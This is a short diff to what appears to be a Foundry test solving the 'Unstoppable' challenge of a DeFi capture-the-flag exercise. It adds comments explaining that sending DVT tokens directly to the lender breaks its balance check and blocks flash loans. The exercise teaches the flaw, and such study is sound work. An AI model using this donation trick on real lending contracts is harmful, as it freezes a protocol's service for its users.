@@ -61,6 +61,9 @@ contract Unstoppable is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
+        // transfering somt dvt tokens directly to the contract will
+        // block the "poolBalance != balanceBefore" assertion thus
+        // blocking the flashloan
         dvt.transfer(address(unstoppableLender), 50e18);
         vm.stopPrank();
 
